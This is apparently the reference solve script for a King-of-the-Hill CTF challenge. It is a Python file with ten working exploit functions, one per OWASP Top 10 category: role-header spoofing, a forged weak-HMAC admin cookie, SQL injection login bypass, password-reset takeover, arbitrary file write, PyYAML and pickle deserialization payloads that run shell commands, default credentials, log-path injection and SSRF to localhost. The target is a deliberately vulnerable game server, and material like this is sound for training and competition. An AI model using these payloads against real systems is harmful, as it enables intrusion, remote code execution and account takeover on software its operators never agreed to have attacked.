#!/usr/bin/env python3
"""
Reference exploit(s) for koth-throne.

KotH loop, run EVERY round: fetch your team's fresh control token from the
platform, then exploit the hill to write that EXACT token into /koth/king. The
token rotates each refresh window and rivals will overwrite the marker, so you
must re-plant it. `crown_via_*` below shows ten independent paths (one per OWASP
category); any single one wins. `crown(ip, port, token)` tries them in order
and returns the path that stuck.

    python3 solve.py <ip> <port> [token]    # token defaults to a demo value
"""
import base64
import hashlib
import hmac
import json
import pickle
import subprocess
import sys

import requests

T = 5  # request timeout


def _king(b):
    try:
        return requests.get(f"{b}/", timeout=T).text.split("current king token:", 1)[-1].strip()
    except requests.RequestException:
        return ""


# --- one function per OWASP path; each must end with token in /koth/king -----

def crown_via_A01(b, tok):  # Broken Access Control — trust client role header
    requests.post(f"{b}/throne", json={"token": tok}, headers={"X-User-Role": "admin"}, timeout=T)


def crown_via_A02(b, tok):  # Crypto Failures — forge weak admin cookie
    p = base64.urlsafe_b64encode(json.dumps({"uid": 1, "username": "x", "role": "admin"}).encode())
    sig = hmac.new(b"secret", p, hashlib.md5).hexdigest()
    requests.post(f"{b}/throne", json={"token": tok}, cookies={"session": p.decode() + "." + sig}, timeout=T)


def crown_via_A03(b, tok):  # Injection — SQLi auth bypass to an admin session
    s = requests.Session()
    s.post(f"{b}/login", json={"username": "admin'-- ", "password": "x"}, timeout=T)
    s.post(f"{b}/throne", json={"token": tok}, timeout=T)


def crown_via_A04(b, tok):  # Insecure Design — leaked reset token -> take admin
    s = requests.Session()
    rt = s.post(f"{b}/reset", json={"username": "admin"}, timeout=T).json().get("token")
    s.post(f"{b}/reset/confirm", json={"token": rt, "password": "pwned"}, timeout=T)
    s.post(f"{b}/login", json={"username": "admin", "password": "pwned"}, timeout=T)
    s.post(f"{b}/throne", json={"token": tok}, timeout=T)


def crown_via_A05(b, tok):  # Security Misconfiguration — arbitrary file write
    requests.get(f"{b}/debug/write", params={"file": "/koth/king", "data": tok}, timeout=T)


def crown_via_A06(b, tok):  # Vulnerable Components — PyYAML RCE writes the marker
    payload = ('!!python/object/apply:subprocess.check_output '
               '[["sh","-c","printf %%s \'%s\' > /koth/king"]]' % tok)
    requests.post(f"{b}/import/yaml", data=payload, timeout=T)


def crown_via_A07(b, tok):  # Auth Failures — default creds admin:admin123
    s = requests.Session()
    s.post(f"{b}/login", json={"username": "admin", "password": "admin123"}, timeout=T)
    s.post(f"{b}/throne", json={"token": tok}, timeout=T)


def crown_via_A08(b, tok):  # Integrity Failures — pickle RCE writes the marker
    class E:
        def __reduce__(self):
            return (subprocess.check_output, (["sh", "-c", "printf %s '" + tok + "' > /koth/king"],))
    requests.post(f"{b}/import/prefs", json={"prefs": base64.b64encode(pickle.dumps(E())).decode()}, timeout=T)


def crown_via_A09(b, tok):  # Logging Failures — header-controlled raw log write
    requests.get(f"{b}/", headers={"X-Forwarded-Log": "/koth/king", "User-Agent": tok}, timeout=T)


def crown_via_A10(b, tok):  # SSRF — reach the localhost-only internal crown
    requests.get(f"{b}/fetch", params={"url": f"http://127.0.0.1:8080/internal/crown?token={tok}"}, timeout=T)


PATHS = [
    ("A01", crown_via_A01), ("A02", crown_via_A02), ("A03", crown_via_A03),
    ("A04", crown_via_A04), ("A05", crown_via_A05), ("A06", crown_via_A06),
    ("A07", crown_via_A07), ("A08", crown_via_A08), ("A09", crown_via_A09),
    ("A10", crown_via_A10),
]


def crown(ip, port, token):
    """Try every path; return the first OWASP category that lands the token."""
    b = f"http://{ip}:{port}"
    for name, fn in PATHS:
        try:
            fn(b, token)
        except requests.RequestException:
            continue
        if _king(b) == token:
            return name
    return None


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"usage: {sys.argv[0]} <ip> <port> [token]", file=sys.stderr)
        sys.exit(2)
    ip, port = sys.argv[1], int(sys.argv[2])
    token = sys.argv[3] if len(sys.argv) > 3 else "demo-token-koth"
    won = crown(ip, port, token)
    if won:
        print(f"crowned via {won}: /koth/king = {token!r}")
    else:
        print("failed to take the hill", file=sys.stderr)
        sys.exit(1)


# ---------------------------------------------------------------------------
# A&D/KotH share one API token. Per-round loop (fill in from the Toolkit):
#   round_token = requests.get(f"{base}/api/Game/{gid}/Ad/Koth/{cid}/Token",
#                   headers={"Authorization": f"Bearer {tok}"}).json()["token"]
#   crown(hill_ip, hill_port, round_token)   # re-run every round; rivals overwrite
# ---------------------------------------------------------------------------
